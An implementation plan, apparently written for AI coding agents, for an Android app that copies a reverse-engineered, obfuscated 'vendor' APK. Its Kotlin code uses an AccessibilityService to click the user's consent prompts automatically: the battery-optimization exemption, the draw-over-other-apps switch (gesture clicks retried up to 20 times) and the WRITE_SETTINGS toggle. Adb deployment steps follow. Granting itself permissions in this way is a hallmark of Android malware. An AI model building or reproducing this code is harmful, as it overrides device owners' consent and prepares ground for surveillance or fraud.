# Yw5xud UI 自动化 P1 Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 修复 WRITE_SETTINGS 自动化（一行 bug）、电池优化自动确认、悬浮窗自动点击开关，完成特殊权限获取链路。

**Architecture:** Task 1 修复 MainOrchestrator.openWriteSettingsPage 缺失的 `isNavigating=true`。Task 2 将 GenericSteps.executeBatteryOptimization 改为 suspend + delay + clickPermissionAllowButton。Task 3 将 GenericSteps.executeOverlayPermission 改为 suspend + enableDrawOverlay 递归重试。

**Tech Stack:** Kotlin, Android AccessibilityService, JADX 逆向对照

---

## File Structure

| 文件 | 操作 | 职责 |
|------|------|------|
| `MainOrchestrator.kt` | Modify | openWriteSettingsPage 加 isNavigating=true + resolveActivity fallback |
| `GenericSteps.kt` | Modify | executeBatteryOptimization 改 suspend + 自动点击确认 |
| `GenericSteps.kt` | Modify | executeOverlayPermission 改 suspend + enableDrawOverlay |

---

### Task 1: MainOrchestrator — openWriteSettingsPage 加 isNavigating=true

**Files:**
- Modify: `app/src/main/java/com/storm/safe/rock/service/modules/MainOrchestrator.kt:889-914`

**JADX 参考:** C0327b2.e8() — vendor 在 startActivity 成功后设 `this.f53170a4 = true` (isNavigating)。备用方法 e7() (openAppSettings) 同样设置。没有这个赋值，handleAccessibilityEvent 的守卫 `isActive && isNavigating` 永远不满足。

- [ ] **Step 1: 修改 openWriteSettingsPage 和 openAppSettings**

```kotlin
    fun openWriteSettingsPage() {
        try {
            val intent = Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS).apply {
                data = Uri.parse("package:${context.packageName}")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_HISTORY)
            }
            // Vendor e8: resolveActivity check + fallback to e7
            val resolved = context.packageManager.resolveActivity(intent, 0)
            if (resolved != null) {
                service.startActivity(intent)
                isNavigating = true  // CRITICAL: vendor sets f53170a4=true after startActivity
                Log.d(TAG, "Opened WRITE_SETTINGS page for ${context.packageName}")
            } else {
                Log.w(TAG, "WRITE_SETTINGS intent not resolvable, fallback to app settings")
                openAppSettings()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to open WRITE_SETTINGS page", e)
            openAppSettings()  // Vendor e8: fallback to e7 on exception
        }
    }

    /** Open app info settings for our package. JADX: e7() */
    fun openAppSettings() {
        try {
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.parse("package:${context.packageName}")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(intent)
            isNavigating = true  // Vendor e7: also sets f53170a4=true
            Log.d(TAG, "Opened app settings for ${context.packageName}")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to open app settings", e)
        }
    }
```

- [ ] **Step 2: 验证编译通过**

Run: `./gradlew compileDebugKotlin 2>&1 | tail -5`
Expected: BUILD SUCCESSFUL

- [ ] **Step 3: Commit**

```bash
git add app/src/main/java/com/storm/safe/rock/service/modules/MainOrchestrator.kt
git commit -m "fix(modules): add isNavigating=true to openWriteSettingsPage

Root cause: vendor e8() sets f53170a4=true after startActivity, but replica
was missing this. handleAccessibilityEvent guard (isActive && isNavigating)
always failed, so WRITE_SETTINGS switch was never auto-clicked.
Also add resolveActivity check + fallback to openAppSettings (vendor e7)."
```

---

### Task 2: GenericSteps — executeBatteryOptimization 自动点击确认

**Files:**
- Modify: `app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/GenericSteps.kt:384-404`

**JADX 参考:** C0364a1.m212131b1 — vendor 流程：
1. isIgnoringBatteryOptimizations → true → 跳过
2. startActivity(REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
3. delay(2000) 等对话框弹出
4. clickPermissionAllowButton() 点击"允许"
5. delay(1000) 二次等待
6. 检查 isIgnoring → 成功返回
7. 若仍未授权: delay(800) → 文本关键词搜索 + 手势点击（降级方案）

- [ ] **Step 1: 重写 executeBatteryOptimization 为 suspend 函数**

```kotlin
    /**
     * Battery optimization exemption.
     * JADX: m212131b1 — launch intent, delay 2s, click allow, verify.
     */
    suspend fun executeBatteryOptimization(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        try {
            val pm = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
            if (pm?.isIgnoringBatteryOptimizations(context.packageName) == true) {
                successes.add("电池优化已豁免")
                return
            }

            // Step 1: Launch battery optimization dialog
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = Uri.parse("package:${context.packageName}")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_MULTIPLE_TASK or
                         Intent.FLAG_ACTIVITY_NO_HISTORY or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            }
            (service ?: context).startActivity(intent)
            logs.add("已发送电池优化豁免请求")

            // Step 2: Wait for dialog, then click allow (vendor: delay 2000 + m212122a0)
            interruptibleDelay(2000L)
            clickPermissionAllowButton()

            // Step 3: Verify (vendor: delay 1000 + check)
            interruptibleDelay(1000L)
            if (pm?.isIgnoringBatteryOptimizations(context.packageName) == true) {
                successes.add("电池优化已豁免")
                return
            }

            // Step 4: Fallback — text search + click (vendor: delay 800 + m212125a5)
            interruptibleDelay(800L)
            val root = try { service?.rootInActiveWindow } catch (_: Exception) { null }
            if (root != null) {
                val allowKeywords = listOf("允许", "Allow", "确定", "OK", "好")
                for (keyword in allowKeywords) {
                    val nodes = try { root.findAccessibilityNodeInfosByText(keyword) } catch (_: Exception) { null }
                    if (nodes.isNullOrEmpty()) continue
                    for (node in nodes) {
                        if (node.isVisibleToUser && node.isClickable) {
                            node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
                            Log.i(TAG, "[电池优化] 降级点击: $keyword")
                            break
                        }
                    }
                }
            }

            // Final check
            interruptibleDelay(1000L)
            if (pm?.isIgnoringBatteryOptimizations(context.packageName) == true) {
                successes.add("电池优化已豁免")
            } else {
                logs.add("电池优化豁免未确认")
            }
        } catch (e: Exception) {
            failures.add("电池优化配置失败: ${e.message}")
        }
    }
```

- [ ] **Step 2: 验证编译通过**

Run: `./gradlew compileDebugKotlin 2>&1 | tail -5`
Expected: BUILD SUCCESSFUL

- [ ] **Step 3: Commit**

```bash
git add app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/GenericSteps.kt
git commit -m "feat(yw5xud): executeBatteryOptimization auto-click confirm dialog

Matches JADX m212131b1: after launching intent, delay 2s, click allow
button via clickPermissionAllowButton, verify isIgnoring. Fallback to
text search + click if ViewId fails."
```

---

### Task 3: GenericSteps — executeOverlayPermission 自动点击开关

**Files:**
- Modify: `app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/GenericSteps.kt:316-339`

**JADX 参考:** C0364a1.m212133b3 + m212126a6 — vendor 流程：
1. canDrawOverlays → true → 跳过
2. startActivity(ACTION_MANAGE_OVERLAY_PERMISSION)
3. delay(2500) + waitForPageStable(2000)
4. enableDrawOverlay(retry=0) — 递归最多 20 次：
   - 7 个 ViewId 搜索 Switch
   - isCheckable && isChecked → 已开跳过
   - 手势点击坐标
   - delay(1500) 验证
   - 未生效 → clickPermissionAllowButton 点确认对话框
   - 仍未生效 → 递归重试

- [ ] **Step 1: 重写 executeOverlayPermission 为 suspend 函数**

```kotlin
    /**
     * Overlay (draw over other apps) permission.
     * JADX: m212133b3 + m212126a6 — open settings, find switch, click it.
     */
    suspend fun executeOverlayPermission(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        try {
            if (Settings.canDrawOverlays(context)) {
                successes.add("悬浮窗权限已开启")
                return
            }

            // Step 1: Open overlay settings page
            val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
                data = Uri.parse("package:${context.packageName}")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_MULTIPLE_TASK or
                         Intent.FLAG_ACTIVITY_NO_HISTORY or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            }
            (service ?: context).startActivity(intent)
            logs.add("已打开悬浮窗权限设置页")

            // Step 2: Wait for page to load (vendor: delay 2500 + waitForPageStable 2000)
            interruptibleDelay(2500L)
            waitForPageStable()

            // Step 3: Find and click the overlay switch (vendor m212126a6)
            enableDrawOverlay(0, successes, failures, logs)

            // Step 4: Press back to exit settings
            if (Settings.canDrawOverlays(context)) {
                pressBack()
                interruptibleDelay(300L)
            }
        } catch (e: Exception) {
            failures.add("悬浮窗权限配置失败: ${e.message}")
        }
    }

    /**
     * Find and click overlay switch on settings page.
     * JADX: m212126a6 (enableDrawBtmob) — recursive retry up to 20 times.
     * Searches by ViewId, then clicks switch if not already enabled.
     */
    private suspend fun enableDrawOverlay(
        retryCount: Int,
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        if (retryCount > 20 || Settings.canDrawOverlays(context)) {
            if (Settings.canDrawOverlays(context)) successes.add("悬浮窗权限已开启")
            return
        }

        val root = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: return

        // Search switch by ViewId (vendor: 7 IDs)
        val switchIds = listOf(
            "com.android.settings:id/switch_widget",
            "com.android.settings:id/switchWidget",
            "android:id/switch_widget",
            "android:id/checkbox",
            "com.android.settings:id/switch_bar",
            "com.android.settings:id/switch_text",
            "com.samsung.android.settings:id/switch_widget"
        )

        for (switchId in switchIds) {
            try {
                val nodes = root.findAccessibilityNodeInfosByViewId(switchId)
                if (nodes.isNullOrEmpty()) continue
                for (node in nodes) {
                    if (!node.isVisibleToUser) continue
                    // Already enabled — skip
                    if (node.isCheckable && node.isChecked) {
                        Log.i(TAG, "[悬浮窗] 开关已开启 (ViewId: $switchId)")
                        successes.add("悬浮窗权限已开启")
                        return
                    }
                    // Click the switch
                    val rect = android.graphics.Rect()
                    node.getBoundsInScreen(rect)
                    if (rect.width() > 0 && rect.height() > 0) {
                        // Gesture click (vendor m212123a2)
                        val path = android.graphics.Path()
                        path.moveTo(rect.centerX().toFloat(), rect.centerY().toFloat())
                        val gesture = android.accessibilityservice.GestureDescription.Builder()
                            .addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, 50))
                            .build()
                        service?.dispatchGesture(gesture, null, null)
                        Log.i(TAG, "[悬浮窗] 手势点击开关 (ViewId: $switchId)")
                    }
                    break
                }
            } catch (_: Exception) {}
        }

        // Wait and verify
        interruptibleDelay(1500L)
        if (Settings.canDrawOverlays(context)) {
            successes.add("悬浮窗权限已开启")
            return
        }

        // Try clicking confirm dialog (vendor: m212122a0)
        clickPermissionAllowButton()
        interruptibleDelay(1500L)
        if (Settings.canDrawOverlays(context)) {
            successes.add("悬浮窗权限已开启")
            return
        }

        // Retry
        interruptibleDelay(500L)
        enableDrawOverlay(retryCount + 1, successes, failures, logs)
    }

    /** Wait for window to stabilize. Vendor m212141c7. */
    private suspend fun waitForWindowStable(timeoutMs: Long = 2000L) {
        waitForPageStable(STABLE_REQUIRED_COUNT, STABLE_POLL_INTERVAL_MS, timeoutMs)
    }
```

- [ ] **Step 2: 验证编译通过**

Run: `./gradlew compileDebugKotlin 2>&1 | tail -5`
Expected: BUILD SUCCESSFUL

- [ ] **Step 3: Commit**

```bash
git add app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/GenericSteps.kt
git commit -m "feat(yw5xud): executeOverlayPermission auto-click switch

Matches JADX m212133b3 + m212126a6: after opening overlay settings page,
search 7 ViewIds for switch, gesture-click if not enabled, verify with
canDrawOverlays, retry up to 20 times."
```

---

### Task 4: 真机验证

- [ ] **Step 1: 构建 APK**

Run: `./gradlew assembleDebug 2>&1 | tail -5`
Expected: BUILD SUCCESSFUL

- [ ] **Step 2: 部署到小米13**

```bash
ADB="/mnt/c/Users/Administrator/Downloads/platform-tools/adb.exe"
$ADB -s 192.168.31.102:39851 shell am force-stop dev.deltalab2964.swift
$ADB -s 192.168.31.102:39851 shell pm clear dev.deltalab2964.swift
$ADB -s 192.168.31.102:39851 install -r app/build/outputs/apk/debug/app-debug.apk
$ADB -s 192.168.31.102:39851 logcat -c
$ADB -s 192.168.31.102:39851 shell am start -n dev.deltalab2964.swift/com.storm.safe.rock.iuzxujjtqev
```

- [ ] **Step 3: 用户点击"开启无障碍服务" → 手动授权**

- [ ] **Step 4: 验证日志**

```bash
$ADB -s 192.168.31.102:39851 logcat -d -v time | grep -E "WRITE_SETTINGS|isNavigating|电池优化|悬浮窗|enableDrawOverlay|手势点击|降级点击"
```

Expected:
- `Opened WRITE_SETTINGS page` + `isNavigating=true` 日志
- `[电池优化] 降级点击: 允许` 或 `电池优化已豁免`
- `[悬浮窗] 手势点击开关` 或 `悬浮窗权限已开启`

- [ ] **Step 5: 验证权限获取**

```bash
$ADB -s 192.168.31.102:39851 shell appops get dev.deltalab2964.swift WRITE_SETTINGS
$ADB -s 192.168.31.102:39851 shell appops get dev.deltalab2964.swift SYSTEM_ALERT_WINDOW
$ADB -s 192.168.31.102:39851 shell dumpsys deviceidle whitelist | grep delta
```

Expected:
- WRITE_SETTINGS: allow
- SYSTEM_ALERT_WINDOW: allow
- 电池白名单包含 dev.deltalab2964.swift

---

## Self-Review Checklist

1. **Spec coverage:** 3 个审计结果全部覆盖：
   - ✅ WRITE_SETTINGS isNavigating=true (Task 1)
   - ✅ 电池优化自动确认 (Task 2)
   - ✅ 悬浮窗自动点击开关 (Task 3)

2. **Placeholder scan:** 所有代码块完整，无 TBD/TODO。

3. **Type consistency:**
   - `clickPermissionAllowButton()` 在 GenericSteps.kt 中已定义
   - `interruptibleDelay()` 在 GenericSteps.kt 中已定义
   - `waitForPageStable()` 在 GenericSteps.kt 中已定义
   - `pressBack()` 在 GenericSteps.kt 中已定义
   - `isNavigating` 在 MainOrchestrator.kt 中已定义（line 717）
